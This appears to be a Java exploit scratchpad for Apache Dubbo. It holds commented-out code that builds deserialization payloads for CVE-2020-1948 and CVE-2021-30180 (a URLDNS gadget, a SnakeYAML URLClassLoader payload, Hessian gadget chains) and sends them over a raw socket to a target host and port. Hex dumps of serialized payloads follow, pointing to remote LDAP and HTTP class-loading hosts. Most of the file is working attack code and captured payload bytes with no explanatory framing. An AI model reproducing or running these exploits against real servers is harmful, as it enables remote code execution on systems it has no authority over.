package com.arliya.dubbo.main;


import com.alibaba.com.caucho.hessian.io.Hessian2Input;
import com.arliya.dubbo.api.Person;
import org.apache.dubbo.common.io.Bytes;
import org.apache.dubbo.rpc.RpcContext;
import org.apache.xbean.spring.context.ClassPathXmlApplicationContext;
import org.yaml.snakeyaml.Yaml;

import java.io.*;
import java.lang.reflect.Field;
import java.net.Socket;
import java.net.URL;
import java.util.HashMap;
import java.util.Random;

public class MainConsumer {
    public static void main(String[] args) throws Exception {
//        ###############正经的远程方法调用
//        ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext("applicationContext.xml");
//        context.start();
//        RpcContext.getContext().setAttachment("dubbo.tag", "admintesssssssss");
//        Person person = (Person) context.getBean("person");
//        String armandhe = person.sayHello("armandhe", 23);
//        System.out.println(armandhe);

//        String name = int.class.getName();
//        System.out.println(name);

//        #####################原生java序列化测试
//        URL url = new URL("http://c80hvr.dnslog.cn");
//        Field hashcode = Class.forName("java.net.URL").getDeclaredField("hashCode");
//        hashcode.setAccessible(true);
//        hashcode.set(url, 0xdeadbeef);
//        HashMap<URL, String> objectObjectHashMap = new HashMap<>();
//        objectObjectHashMap.put(url, "test");
//        hashcode.set(url, -1);
//        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
//        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
//        objectOutputStream.writeObject(objectObjectHashMap);
//
//        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());
//        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
//        objectInputStream.readObject();

//        ##################  Apache Dubbo YAML 反序列化漏洞(CVE-2021-30180) 可以用这个payload，具体操作尚不清楚
//        String payload = "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ['http://trrrest114455.hls8dx.dnslog.cn']]]]";
//        Yaml yaml = new Yaml();
//        yaml.load(payload);


    }
//        Apache Dubbo 反序列化代码执行（CVE-2020-1948） 两条不同的利用链
//        byte[] payloadByJdbc = SerializeByJdbcRowSetImpl.createPayload();
//        byte[] payloadBySpring = SerializeBySpringPartiallyComparableAdvisorHolder.createPayload();
//
//
//// #####################Dubbo HEADER##################
//        // header.
//        byte[] header = new byte[16];
//        // set magic number.
//        Bytes.short2bytes((short) 0xdabb, header);
//        // set request and serialization flag.
//        header[2] = (byte) ((byte) 0x80 | 0x20 | 2);
//
//        // set request id.
//        Bytes.long2bytes(new Random().nextInt(100000000), header, 4);
//        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
//        Bytes.int2bytes(payloadByJdbc.length, header, 12);
//        outputStream.write(header);
//        outputStream.write(payloadByJdbc);
//        byte[] bytes = outputStream.toByteArray();
//
//
//
////        ###################打印序列化数据######################
//        System.out.println(new String(bytes));
//        StringBuilder sb = new StringBuilder();
//        for (byte b : bytes) {
//            sb.append(String.format("%02x", b));
//        }
//        System.out.println(sb);
//
////  ##########################向目标发送payload###############
//        Socket socket = new Socket("192.168.2.101", 20880);
//        OutputStream payloadOutputStream = socket.getOutputStream();
//        payloadOutputStream.write(bytes);
//        payloadOutputStream.flush();
//        payloadOutputStream.close();
////        Hessian2Input
//    }
        }
//mag     st  请求标识 64位      length  M  C   长度
//dabb a2 00 0000000002b2588d 000002a1 48 43 30 27 636f6d2e726f6d65746f6f6c732e726f6d652e666565642e696d706c2e457175616c734265616e92096265616e436c617373036f626a60430f6a6176612e6c616e672e436c61737391046e616d65613029636f6d2e726f6d65746f6f6c732e726f6d652e666565642e696d706c2e546f537472696e674265616e433029636f6d2e726f6d65746f6f6c732e726f6d652e666565642e696d706c2e546f537472696e674265616e92096265616e436c617373036f626a62611d636f6d2e73756e2e726f777365742e4a646263526f77536574496d706c431d636f6d2e73756e2e726f777365742e4a646263526f77536574496d706cac07636f6d6d616e640355524c0a 64617461536f75726365 0a 726f77536574 547970650b73686f7744656c657465640c717565727954696d656f7574076d6178526f77730c6d61784669656c6453697a650b636f6e63757272656e637908726561644f6e6c791065736361706550726f63657373696e670969736f6c6174696f6e08666574636844697209666574636853697a6504636f6e6e02707302727306726f77734d44057265734d440d694d61746368436f6c756d6e730f7374724d61746368436f6c756d6e730c62696e61727953747265616d0d756e69636f646553747265616d0b617363696953747265616d0a6368617253747265616d036d6170096c697374656e65727306706172616d73634e4e30306c6461703a2f2f6a756c696f736470796b61716e76612e646e732e39623535303161332e617873732e78797a2f466f6fcbec46909090cbf0545492cbe8904e4e4e4e4e56106a6176612e7574696c2e566563746f729a8f8f8f8f8f8f8f8f8f8f56909a03466f6f4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4d136a6176612e7574696c2e486173687461626c655a5191519151915a
//dabb a2 00 00000000013371c8 000002a1 48433027636f6d2e726f6d65746f6f6c732e726f6d652e666565642e696d706c2e457175616c734265616e92096265616e436c617373036f626a60430f6a6176612e6c616e672e436c61737391046e616d65613029636f6d2e726f6d65746f6f6c732e726f6d652e666565642e696d706c2e546f537472696e674265616e433029636f6d2e726f6d65746f6f6c732e726f6d652e666565642e696d706c2e546f537472696e674265616e92096265616e436c617373036f626a62611d636f6d2e73756e2e726f777365742e4a646263526f77536574496d706c431d636f6d2e73756e2e726f777365742e4a646263526f77536574496d706cac07636f6d6d616e640355524c0a 64617461536f75726365 0a 726f77536574 547970650b73686f7744656c657465640c717565727954696d656f7574076d6178526f77730c6d61784669656c6453697a650b636f6e63757272656e637908726561644f6e6c791065736361706550726f63657373696e670969736f6c6174696f6e08666574636844697209666574636853697a6504636f6e6e02707302727306726f77734d44057265734d440d694d61746368436f6c756d6e730f7374724d61746368436f6c756d6e730c62696e61727953747265616d0d756e69636f646553747265616d0b617363696953747265616d0a6368617253747265616d036d6170096c697374656e65727306706172616d73634e4e30306c6461703a2f2f6a756c696f736470796b61716e76622e646e732e39623535303161332e617873732e78797a2f466f6fcbec46909090cbf0545492cbe8904e4e4e4e4e56106a6176612e7574696c2e566563746f729a8f8f8f8f8f8f8f8f8f8f56909a03466f6f4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4d136a6176612e7574696c2e486173687461626c655a5191519151915a
//dabb a2 00 0000000003ad8bbd 000002a1 48433027636f6d2e726f6d65746f6f6c732e726f6d652e666565642e696d706c2e457175616c734265616e92096265616e436c617373036f626a60430f6a6176612e6c616e672e436c61737391046e616d65613029636f6d2e726f6d65746f6f6c732e726f6d652e666565642e696d706c2e546f537472696e674265616e433029636f6d2e726f6d65746f6f6c732e726f6d652e666565642e696d706c2e546f537472696e674265616e92096265616e436c617373036f626a62611d636f6d2e73756e2e726f777365742e4a646263526f77536574496d706c431d636f6d2e73756e2e726f777365742e4a646263526f77536574496d706cac07636f6d6d616e640355524c0a 64617461536f75726365 0a 726f77536574 547970650b73686f7744656c657465640c717565727954696d656f7574076d6178526f77730c6d61784669656c6453697a650b636f6e63757272656e637908726561644f6e6c791065736361706550726f63657373696e670969736f6c6174696f6e08666574636844697209666574636853697a6504636f6e6e02707302727306726f77734d44057265734d440d694d61746368436f6c756d6e730f7374724d61746368436f6c756d6e730c62696e61727953747265616d0d756e69636f646553747265616d0b617363696953747265616d0a6368617253747265616d036d6170096c697374656e65727306706172616d73634e4e30306c6461703a2f2f6a756c696f736470796b61716e76632e646e732e39623535303161332e617873732e78797a2f466f6fcbec46909090cbf0545492cbe8904e4e4e4e4e56106a6176612e7574696c2e566563746f729a8f8f8f8f8f8f8f8f8f8f56909a03466f6f4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4d136a6176612e7574696c2e486173687461626c655a5191519151915a
//dabb a2 00 00000000005b367d 000002a2 48433027636f6d2e726f6d65746f6f6c732e726f6d652e666565642e696d706c2e457175616c734265616e92096265616e436c617373036f626a60430f6a6176612e6c616e672e436c61737391046e616d65613029636f6d2e726f6d65746f6f6c732e726f6d652e666565642e696d706c2e546f537472696e674265616e433029636f6d2e726f6d65746f6f6c732e726f6d652e666565642e696d706c2e546f537472696e674265616e92096265616e436c617373036f626a62611d636f6d2e73756e2e726f777365742e4a646263526f77536574496d706c431d636f6d2e73756e2e726f777365742e4a646263526f77536574496d706cac07636f6d6d616e640355524c0a 64617461536f75726365 0a 726f77536574 547970650b73686f7744656c657465640c717565727954696d656f7574076d6178526f77730c6d61784669656c6453697a650b636f6e63757272656e637908726561644f6e6c791065736361706550726f63657373696e670969736f6c6174696f6e08666574636844697209666574636853697a6504636f6e6e02707302727306726f77734d44057265734d440d694d61746368436f6c756d6e730f7374724d61746368436f6c756d6e730c62696e61727953747265616d0d756e69636f646553747265616d0b617363696953747265616d0a6368617253747265616d036d6170096c697374656e65727306706172616d73634e4e30316c6461703a2f2f6a756c696f736470796b61716e7663612e646e732e39623535303161332e617873732e78797a2f466f6fcbec46909090cbf0545492cbe8904e4e4e4e4e56106a6176612e7574696c2e566563746f729a8f8f8f8f8f8f8f8f8f8f56909a03466f6f4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4d136a6176612e7574696c2e486173687461626c655a5191519151915a
//dabb a2 00 000000000518f502 00000451 43 303b 6f72672e6170616368652e786265616e2e6e616d696e672e636f6e746578742e436f6e746578745574696c24526561644f6e6c7942696e64696e679808626f756e644f626a07636f6e746578740576616c756505697352656c0866756c6c4e616d6509636c6173734e616d65046e616d650a697352656c61746976656043166a617661782e6e616d696e672e5265666572656e63659405616464727314636c617373466163746f72794c6f636174696f6e0c636c617373466163746f727909636c6173734e616d656170106a6176612e7574696c2e566563746f7216687474703a2f2f3132372e302e302e313a383838382f03466f6f03466f6f43302f6f72672e6170616368652e786265616e2e6e616d696e672e636f6e746578742e5772697461626c65436f6e746578749e0d636f6e74657874416363657373157061727365644e616d65496e4e616d6573706163650d6d6173746572436f6e7465787411636f6e7465787446656465726174696f6e08696e6465785265660b62696e64696e67735265660977726974654c6f636b06696e43616c6c0a6d6f6469666961626c650f6e616d65496e4e616d65737061636516617373756d6544657265666572656e6365426f756e6419636865636b44657265666572656e6365446966666572656e7414737570706f72745265666572656e636561626c650f63616368655265666572656e636573624e4e4e4e4e4e4e4e464e46464646519154053c3c3c3c3c4e03666f6f46